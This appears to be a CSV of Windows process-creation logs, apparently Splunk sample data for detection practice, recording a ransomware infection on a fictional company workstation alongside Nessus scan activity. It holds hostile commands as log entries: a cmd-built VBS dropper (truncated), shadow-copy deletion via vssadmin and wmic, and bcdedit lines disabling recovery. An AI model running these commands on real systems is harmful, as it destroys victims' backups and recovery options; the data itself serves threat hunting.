"_time",CommandLine,host
"2016-08-24T10:55:17.000-0600","C:\Windows\system32\wbem\wmiprvse.exe -Embedding",we1149srv
"2016-08-24T10:55:15.000-0600","C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding",we1149srv
"2016-08-24T10:53:39.000-0600","C:\Windows\System32\slui.exe -Embedding",we8105desk
"2016-08-24T10:51:05.000-0600","C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding",we8105desk
"2016-08-24T10:49:42.000-0600","""C:\Windows\system32\SearchFilterHost.exe"" 0 524 528 536 65536 532",we8105desk
"2016-08-24T10:49:42.000-0600","""C:\Windows\system32\SearchProtocolHost.exe"" Global\UsGthrFltPipeMssGthrPipe8_ Global\UsGthrCtrlFltPipeMssGthrPipe8 1 -2147483646 ""Software\Microsoft\Windows Search"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)"" ""C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc"" ""DownLevelDaemon""",we8105desk
"2016-08-24T10:49:24.000-0600","\??\C:\Windows\system32\conhost.exe",we8105desk
"2016-08-24T10:49:24.000-0600","""C:\Windows\System32\bcdedit.exe"" /set {default} bootstatuspolicy ignoreallfailures",we8105desk
"2016-08-24T10:49:24.000-0600","\??\C:\Windows\system32\conhost.exe",we8105desk
"2016-08-24T10:49:24.000-0600","""C:\Windows\System32\bcdedit.exe"" /set {default} recoveryenabled no",we8105desk
"2016-08-24T10:49:23.000-0600","\??\C:\Windows\system32\conhost.exe",we8105desk
"2016-08-24T10:49:23.000-0600","""C:\Windows\system32\wbem\wmic.exe"" shadowcopy delete",we8105desk
"2016-08-24T10:49:23.000-0600","C:\Windows\System32\svchost.exe -k swprv",we8105desk
"2016-08-24T10:49:23.000-0600","C:\Windows\system32\vssvc.exe",we8105desk
"2016-08-24T10:49:23.000-0600","\??\C:\Windows\system32\conhost.exe",we8105desk
"2016-08-24T10:49:23.000-0600","""C:\Windows\system32\vssadmin.exe"" delete shadows /all /quiet",we8105desk
"2016-08-24T10:49:22.000-0600","C:\Windows\SysWOW64\DllHost.exe /Processid:{3AD05575-8857-4850-9277-11B85BDB8E09}",we8105desk
"2016-08-24T10:49:22.000-0600","C:\Windows\system32\DllHost.exe /Processid:{E10F6C3A-F1AE-4ADC-AA9D-2FE65525666E}",we8105desk
"2016-08-24T10:49:21.000-0600","consent.exe 928 274 0000000001CCA4D0",we8105desk
"2016-08-24T10:49:11.000-0600","""C:\Users\bob.smith.WAYNECORPINC\AppData\Roaming\{35ACA89F-933F-6A5D-2776-A3589FB99832}\osk.exe""",we8105desk
"2016-08-24T10:49:03.000-0600","""C:\Users\bob.smith.WAYNECORPINC\AppData\Roaming\{35ACA89F-933F-6A5D-2776-A3589FB99832}\osk.exe""",we8105desk
"2016-08-24T10:49:03.000-0600","""C:\Windows\SysWOW64\QqJXZrBKCk72XzRgZs\AdapterTroubleshooter.exe""",we8105desk
"2016-08-24T10:49:03.000-0600","C:\Windows\system32\DllHost.exe /Processid:{E10F6C3A-F1AE-4ADC-AA9D-2FE65525666E}",we8105desk
"2016-08-24T10:49:03.000-0600","consent.exe 928 502 00000000031D8160",we8105desk
"2016-08-24T10:49:03.000-0600","""C:\Windows\SysWOW64\QqJXZrBKCk72XzRgZs\AdapterTroubleshooter.exe""",we8105desk
"2016-08-24T10:49:03.000-0600","consent.exe 928 274 0000000001CCA4D0",we8105desk
"2016-08-24T10:49:03.000-0600","consent.exe 928 274 0000000001CCA4D0",we8105desk
"2016-08-24T10:49:03.000-0600","C:\Windows\SysWOW64\DllHost.exe /Processid:{3AD05575-8857-4850-9277-11B85BDB8E09}",we8105desk
"2016-08-24T10:49:03.000-0600","C:\Windows\system32\DllHost.exe /Processid:{E10F6C3A-F1AE-4ADC-AA9D-2FE65525666E}",we8105desk
"2016-08-24T10:49:02.000-0600","consent.exe 928 274 0000000001CCA4D0",we8105desk
"2016-08-24T10:49:01.000-0600","""C:\Windows\SysWOW64\explorer.exe""",we8105desk
"2016-08-24T10:48:50.000-0600","""C:\Users\bob.smith.WAYNECORPINC\AppData\Roaming\{35ACA89F-933F-6A5D-2776-A3589FB99832}\osk.exe""",we8105desk
"2016-08-24T10:48:42.000-0600","ping  -n 1 127.0.0.1",we8105desk
"2016-08-24T10:48:41.000-0600","taskkill  /t /f /im ""121214.tmp""",we8105desk
"2016-08-24T10:48:41.000-0600","\??\C:\Windows\system32\conhost.exe",we8105desk
"2016-08-24T10:48:41.000-0600","/d /c taskkill /t /f /im ""121214.tmp"" &gt; NUL &amp; ping -n 1 127.0.0.1 &gt; NUL &amp; del ""C:\Users\bob.smith.WAYNECORPINC\AppData\Roaming\121214.tmp"" &gt; NUL",we8105desk
"2016-08-24T10:48:41.000-0600","""C:\Users\bob.smith.WAYNECORPINC\AppData\Roaming\{35ACA89F-933F-6A5D-2776-A3589FB99832}\osk.exe""",we8105desk
"2016-08-24T10:48:29.000-0600","""C:\Users\bob.smith.WAYNECORPINC\AppData\Roaming\121214.tmp""",we8105desk
"2016-08-24T10:48:21.000-0600","""C:\Users\bob.smith.WAYNECORPINC\AppData\Roaming\121214.tmp""",we8105desk
"2016-08-24T10:48:21.000-0600","\??\C:\Windows\system32\conhost.exe",we8105desk
"2016-08-24T10:48:21.000-0600","""C:\Windows\System32\cmd.exe"" /C START """" ""C:\Users\bob.smith.WAYNECORPINC\AppData\Roaming\121214.tmp""",we8105desk
"2016-08-24T10:45:17.000-0600","C:\Windows\system32\wbem\wmiprvse.exe -Embedding",we1149srv
"2016-08-24T10:45:15.000-0600","C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding",we1149srv
"2016-08-24T10:44:21.000-0600","C:\Windows\SysWOW64\DllHost.exe /Processid:{1EF75F33-893B-4E8F-9655-C3D602BA4897}",we8105desk
"2016-08-24T10:44:08.000-0600","C:\Windows\SysWOW64\DllHost.exe /Processid:{1EF75F33-893B-4E8F-9655-C3D602BA4897}",we8105desk
"2016-08-24T10:44:07.000-0600","C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}",we8105desk
"2016-08-24T10:43:54.000-0600","C:\Windows\SysWOW64\DllHost.exe /Processid:{1EF75F33-893B-4E8F-9655-C3D602BA4897}",we8105desk
"2016-08-24T10:43:54.000-0600","""C:\Windows\explorer.exe""",we8105desk
"2016-08-24T10:43:27.000-0600","C:\Windows\splwow64.exe 8192",we8105desk
"2016-08-24T10:43:21.000-0600","""C:\Windows\System32\WScript.exe"" ""C:\Users\bob.smith.WAYNECORPINC\AppData\Roaming\20429.vbs""",we8105desk
"2016-08-24T10:43:21.000-0600","\??\C:\Windows\system32\conhost.exe",we8105desk
"2016-08-24T10:43:21.000-0600","cmd.exe /V /C set ""GSI=%APPDATA%\%RANDOM%.vbs"" &amp;&amp; (for %i in (""DIm RWRL"" ""FuNCtioN GNbiPp(Pt5SZ1)"" ""EYnt=45"" ""GNbiPp=AsC(Pt5SZ1)"" ""Xn1=52 This line has been artificially truncated because it was causing Splunk Security Essentials to be flagged by Avast AV. Because we used this in part to look for very long CLI strings... this will be repeated. This line has been artificially truncated because it was causing Splunk Security Essentials to be flagged by Avast AV. Because we used this in part to look for very long CLI strings... this will be repeated. This line has been artificially truncated because it was causing Splunk Security Essentials to be flagged by Avast AV. Because we used this in part to look for very long CLI strings... this will be repeated. This line has been artificially truncated because it was causing Splunk Security Essentials to be flagged by Avast AV. Because we used this in part to look for very long CLI strings... this will be repeated. This line has been artificially truncated because it was causing Splunk Security Essentials to be flagged by Avast AV. Because we used this in part to look for very long CLI strings... this will be repeated. This line has been artificially truncated because it was causing Splunk Security Essentials to be flagged by Avast AV. Because we used this in part to look for very long CLI strings... this will be repeated. This line has been artificially truncated because it was causing Splunk Security Essentials to be flagged by Avast AV. Because we used this in part to look for very long CLI strings... this will be repeated. This line has been artificially truncated because it was causing Splunk Security Essentials to be flagged by Avast AV. Because we used this in part to look for very long CLI strings... this will be repeated. This line has been artificially truncated because it was causing Splunk Security Essentials to be flagged by Avast AV. Because we used this in part to look for very long CLI strings... this will be repeated. This line has been artificially truncated because it was causing Splunk Security Essentials to be flagged by Avast AV. Because we used this in part to look for very long CLI strings... this will be repeated. This line has been artificially truncated because it was causing Splunk Security Essentials to be flagged by Avast AV. Because we used this in part to look for very long CLI strings... this will be repeated. This line has been artificially truncated because it was causing Splunk Security Essentials to be flagged by Avast AV. Because we used this in part to look for very long CLI strings... this will be repeated. This line has been artificially truncated because it was causing Splunk Security Essentials to be flagged by Avast AV. Because we used this in part to look for very long CLI strings... this will be repeated. This line has been artificially truncated because it was causing Splunk Security Essentials to be flagged by Avast AV. Because we used this in part to look for very long CLI strings... this will be repeated. This line has been artificially truncated because it was causing Splunk Security Essentials to be flagged by Avast AV. Because we used this in part to look for very long CLI strings... this will be repeated. This line has been artificially truncated because it was causing Splunk Security Essentials to be flagged by Avast AV. Because we used this in part to look for very long CLI strings... this will be repeated. This line has been artificially truncated because it was causing Splunk Security Essentials to be flagged by Avast AV. Because we used this in part to look for very long CLI strings... this will be repeated. This line has been artificially truncated because it was causing Splunk Security Essentials to be flagged by Avast AV. Because we used this in part to look for very long CLI strings... this will be repeated. This line has been artificially truncated because it was causing Splunk Security Essentials to be flagged by Avast AV. Because we used this in part to look for very long CLI strings... this will be repeated. This line has been artificially truncated because it was causing Splunk Security Essentials to be flagged by Avast AV. Because we used this in part to look for very long CLI strings... this will be repeated. This line has been artificially truncated because it was causing Splunk Security Essentials to be flagged by Avast AV. Because we used this in part to look for very long CLI strings... this will be repeated. This line has been artificially truncated because it was causing Splunk Security Essentials to be flagged by Avast AV. Because we used this in part to look for very long CLI strings... this will be repeated. This line has been artificially truncated because it was causing Splunk Security Essentials to be flagged by Avast AV. Because we used this in part to look for very long CLI strings... this will be repeated. cho %~i)&gt;""!GSI!"" &amp;&amp; start """" ""!GSI!""",we8105desk
"2016-08-24T10:43:17.000-0600","C:\Windows\SysWOW64\DllHost.exe /Processid:{1EF75F33-893B-4E8F-9655-C3D602BA4897}",we8105desk
"2016-08-24T10:43:17.000-0600","wmiadap.exe /R /T",we8105desk
"2016-08-24T10:43:16.000-0600","""C:\Program Files\Common Files\Microsoft Shared\OfficeSoftwareProtectionPlatform\OSPPSVC.EXE""",we8105desk
"2016-08-24T10:43:12.000-0600","""C:\Program Files (x86)\Microsoft Office\Office14\WINWORD.EXE"" /n /f ""D:\Miranda_Tate_unveiled.dotm""",we8105desk
"2016-08-24T10:43:12.000-0600","C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}",we8105desk
"2016-08-24T10:43:03.000-0600","C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}",we8105desk
"2016-08-24T10:43:03.000-0600","C:\Windows\SysWOW64\DllHost.exe /Processid:{1EF75F33-893B-4E8F-9655-C3D602BA4897}",we8105desk
"2016-08-24T10:43:02.000-0600","""C:\Windows\explorer.exe""",we8105desk
"2016-08-24T10:42:16.000-0600","C:\Windows\system32\AUDIODG.EXE 0x8b8",we8105desk
"2016-08-24T10:36:59.000-0600","""dwm.exe""",we9041srv
"2016-08-24T10:36:59.000-0600","""LogonUI.exe"" /flags:0x0",we9041srv
"2016-08-24T10:36:58.000-0600","winlogon.exe",we9041srv
"2016-08-24T10:36:58.000-0600","%SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16",we9041srv
"2016-08-24T10:36:58.000-0600","\SystemRoot\System32\smss.exe 00000000 00000050",we9041srv
"2016-08-24T10:36:44.000-0600","choice  /T 1 /C X /D X /N",we8105desk
"2016-08-24T10:36:44.000-0600","\??\C:\Windows\system32\conhost.exe",we8105desk
"2016-08-24T10:36:44.000-0600","cmd /c C:\Windows\temp\nessus_W7GLH62C.bat",we8105desk
"2016-08-24T10:36:26.000-0600","""dwm.exe""",we1149srv
"2016-08-24T10:36:25.000-0600","""LogonUI.exe"" /flags:0x0",we1149srv
"2016-08-24T10:36:24.000-0600","winlogon.exe",we1149srv
"2016-08-24T10:36:24.000-0600","%SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16",we1149srv
"2016-08-24T10:36:24.000-0600","\SystemRoot\System32\smss.exe 00000000 00000050",we1149srv
"2016-08-24T10:36:14.000-0600","""C:\Windows\system32\SearchFilterHost.exe"" 0 524 528 536 65536 532",we8105desk
"2016-08-24T10:36:14.000-0600","C:\Windows\tenable_mw_scan_142a90001fb65e0beb1751cc8c63edd0.exe",we8105desk
"2016-08-24T10:36:14.000-0600","\??\C:\Windows\system32\conhost.exe",we8105desk
"2016-08-24T10:36:14.000-0600","sc start tenable_mw_scan type=1 output=nessus_SFBBT7QA.txt",we8105desk
"2016-08-24T10:36:02.000-0600","choice  /T 1 /C X /D X /N",we9041srv
"2016-08-24T10:36:02.000-0600","\??\C:\Windows\system32\conhost.exe 0xffffffff",we9041srv
"2016-08-24T10:36:02.000-0600","cmd /c C:\Windows\temp\nessus_ZCHPYH15.bat",we9041srv
"2016-08-24T10:35:36.000-0600","schtasks  /query /XML",we8105desk
"2016-08-24T10:35:36.000-0600","\??\C:\Windows\system32\conhost.exe",we8105desk
"2016-08-24T10:35:36.000-0600","cmd /c ""schtasks /query /XML &gt; %SystemRoot%\TEMP\nessus_VPG2T4UF.TMP &amp; ren %SystemRoot%\TEMP\nessus_VPG2T4UF.TMP nessus_VPG2T4UF.TXT""",we8105desk
"2016-08-24T10:35:32.000-0600","C:\Windows\tenable_mw_scan_142a90001fb65e0beb1751cc8c63edd0.exe",we9041srv
"2016-08-24T10:35:32.000-0600","\??\C:\Windows\system32\conhost.exe 0xffffffff",we9041srv
"2016-08-24T10:35:32.000-0600","sc start tenable_mw_scan type=1 output=nessus_QYVJLVDT.txt",we9041srv
"2016-08-24T10:35:17.000-0600","C:\Windows\system32\wbem\wmiprvse.exe -Embedding",we1149srv
"2016-08-24T10:35:15.000-0600","C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding",we1149srv
"2016-08-24T10:35:08.000-0600","C:\Windows\system32\wbem\wmiprvse.exe -Embedding",we9041srv
"2016-08-24T10:34:56.000-0600","netsh  advfirewall show allprofiles firewallpolicy",we8105desk
"2016-08-24T10:34:56.000-0600","cmd  /c netsh advfirewall show allprofiles firewallpolicy",we8105desk
"2016-08-24T10:34:55.000-0600","netsh  advfirewall firewall show rule name=all verbose",we8105desk
"2016-08-24T10:34:55.000-0600","\??\C:\Windows\system32\conhost.exe",we8105desk
"2016-08-24T10:34:55.000-0600","cmd /c netsh advfirewall firewall show rule name=all verbose &gt; %SystemRoot%\TEMP\nessus_OCREA4YZ.TMP &amp; cmd /c netsh advfirewall show allprofiles firewallpolicy &gt;&gt; %SystemRoot%\TEMP\nessus_OCREA4YZ.TMP &amp; move %SystemRoot%\TEMP\nessus_OCREA4YZ.TMP %SystemRoot%\TEMP\nessus_OCREA4YZ.TXT",we8105desk
"2016-08-24T10:34:50.000-0600","schtasks  /query /XML",we9041srv
"2016-08-24T10:34:50.000-0600","\??\C:\Windows\system32\conhost.exe 0xffffffff",we9041srv
"2016-08-24T10:34:50.000-0600","cmd /c ""schtasks /query /XML &gt; %SystemRoot%\TEMP\nessus_W426FMMY.TMP &amp; ren %SystemRoot%\TEMP\nessus_W426FMMY.TMP nessus_W426FMMY.TXT""",we9041srv
"2016-08-24T10:34:21.000-0600","tasklist  /svc",we8105desk
"2016-08-24T10:34:21.000-0600","\??\C:\Windows\system32\conhost.exe",we8105desk
"2016-08-24T10:34:21.000-0600","cmd /c ""tasklist /svc &gt; %SystemRoot%\TEMP\nessus_task_listY42QJDIQ.TMP &amp; ren %SystemRoot%\TEMP\nessus_task_listY42QJDIQ.TMP nessus_task_listY42QJDIQ.TXT""",we8105desk
"2016-08-24T10:34:19.000-0600","C:\Windows\system32\svchost.exe -k wsappx",we9041srv
"2016-08-24T10:34:14.000-0600","powershell  ""Get-AppxPackage -AllUsers | select name, version, architecture, publisher | Format-List | out-string -width 4096""",we9041srv
"2016-08-24T10:34:14.000-0600","\??\C:\Windows\system32\conhost.exe 0xffffffff",we9041srv
"2016-08-24T10:34:14.000-0600","cmd /c powershell ""Get-AppxPackage -AllUsers | select name, version, architecture, publisher | Format-List | out-string -width 4096"" &gt; %SystemRoot%\TEMP\nessus_R3OP3JQV.TMP &amp; move %SystemRoot%\TEMP\nessus_R3OP3JQV.TMP %SystemRoot%\TEMP\nessus_R3OP3JQV.TXT",we9041srv
"2016-08-24T10:34:11.000-0600","netsh  advfirewall show allprofiles firewallpolicy",we9041srv
"2016-08-24T10:34:11.000-0600","cmd  /c netsh advfirewall show allprofiles firewallpolicy",we9041srv
"2016-08-24T10:34:11.000-0600","netsh  advfirewall firewall show rule name=all verbose",we9041srv
"2016-08-24T10:34:11.000-0600","\??\C:\Windows\system32\conhost.exe 0xffffffff",we9041srv
"2016-08-24T10:34:11.000-0600","cmd /c netsh advfirewall firewall show rule name=all verbose &gt; %SystemRoot%\TEMP\nessus_SV9VMSPT.TMP &amp; cmd /c netsh advfirewall show allprofiles firewallpolicy &gt;&gt; %SystemRoot%\TEMP\nessus_SV9VMSPT.TMP &amp; move %SystemRoot%\TEMP\nessus_SV9VMSPT.TMP %SystemRoot%\TEMP\nessus_SV9VMSPT.TXT",we9041srv
"2016-08-24T10:34:06.000-0600","C:\Windows\system32\wbem\wmiprvse.exe -Embedding",we8105desk
"2016-08-24T10:34:06.000-0600","C:\Windows\system32\svchost.exe -k regsvc",we8105desk
"2016-08-24T10:34:05.000-0600","netsh  wlan show interface",we8105desk
"2016-08-24T10:34:05.000-0600","\??\C:\Windows\system32\conhost.exe",we8105desk
"2016-08-24T10:34:05.000-0600","cmd /c netsh wlan show interface &gt; %SystemRoot%\TEMP\nessus_IQK9FYH1.TMP &amp; move %SystemRoot%\TEMP\nessus_IQK9FYH1.TMP %SystemRoot%\TEMP\nessus_IQK9FYH1.TXT",we8105desk
